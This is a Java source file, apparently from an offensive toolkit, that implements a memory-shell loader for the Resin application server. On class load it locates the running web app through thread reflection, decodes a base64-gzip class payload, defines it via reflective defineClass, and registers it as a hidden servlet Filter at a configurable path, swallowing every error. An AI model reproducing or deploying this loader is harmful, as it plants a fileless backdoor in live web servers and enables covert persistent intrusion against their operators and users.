package com.ppp.middleware.loader;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.Middleware;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 * <p>
 */
@Middleware(Middleware.Resin)
@MemShell(MemShell.Filter)
@JavaClassModifiable({JavaClassModifiable.CLASSNAME, JavaClassModifiable.PATH, JavaClassModifiable.NAME})
public class ResinFilterThreadLoader {
    private static String gzipObject;
    private static String CLASSNAME;
    private static String PATH;
    private static String NAME;

    public ResinFilterThreadLoader() {
    }

    static {
        try {
            inject();
        } catch (Throwable e) {

        }
    }

    /**
     * Resin Listener
     */
    public static void inject() throws Exception {
        Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");

        for (int i = 0; i < threads.length; i++) {
            try {
                Class cls = threads[i].currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
                Object contextRequest = cls.getMethod("getContextRequest").invoke(null);
                Object webapp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
                if (webapp == null) {
                    continue;
                }

                try {
                    Object _filterManager = getFieldValue(webapp, "_filterManager");
                    HashMap _filters = (HashMap) getFieldValue(_filterManager, "_filters");
                    if (_filters.containsKey(NAME)) {
                        return;
                    }
                    HashMap _urlPatterns = (HashMap) getFieldValue(_filterManager, "_urlPatterns");
                    if (_urlPatterns.containsKey(NAME)) {
                        return;
                    }
                    HashMap _instances = (HashMap) getFieldValue(_filterManager, "_instances");
                    if (_instances.containsKey(NAME)) {
                        return;
                    }
                } catch (Exception e) {

                }

                // 动态代理兼容 javax jakarta
                Class filterClass = null;
                try {
                    filterClass = Class.forName("jakarta.servlet.Filter");
                } catch (Exception e) {
                    try {
                        filterClass = Class.forName("javax.servlet.Filter");
                    } catch (ClassNotFoundException ex) {

                    }
                }

                byte[] bytes = decompress(gzipObject);
                ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class clazz;
                try {
                    clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
                } catch (Exception e) {
                    clazz = classLoader.loadClass(CLASSNAME);
                }

                Object javaObject = clazz.newInstance();
                Object object = Proxy.newProxyInstance(filterClass.getClassLoader(), new Class[]{filterClass}, (InvocationHandler) javaObject);

                Object filterMapping = Class.forName("com.caucho.server.dispatch.FilterMapping").newInstance();
                setFieldValue(filterMapping, "_filter", object);

                invokeMethod(filterMapping.getClass().getSuperclass(), filterMapping, "setFilterClass", new Class[]{String.class}, new Object[]{object.getClass().getName()});
                invokeMethod(filterMapping.getClass().getSuperclass(), filterMapping, "setFilterName", new Class[]{String.class}, new Object[]{NAME});

                Object urlPattern = invokeMethod(filterMapping.getClass(), filterMapping, "createUrlPattern", new Class[]{}, new Object[]{});
                invokeMethod(urlPattern.getClass(), urlPattern, "addText", new Class[]{String.class}, new Object[]{PATH});
                invokeMethod(webapp.getClass(), webapp, "addFilterMapping", new Class[]{Class.forName("com.caucho.server.dispatch.FilterMapping")}, new Object[]{filterMapping});

                return;
            } catch (Exception e) {

            }
        }
    }

    // tools
    public static byte[] decompress(String gzipObject) throws IOException {
        final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }


}
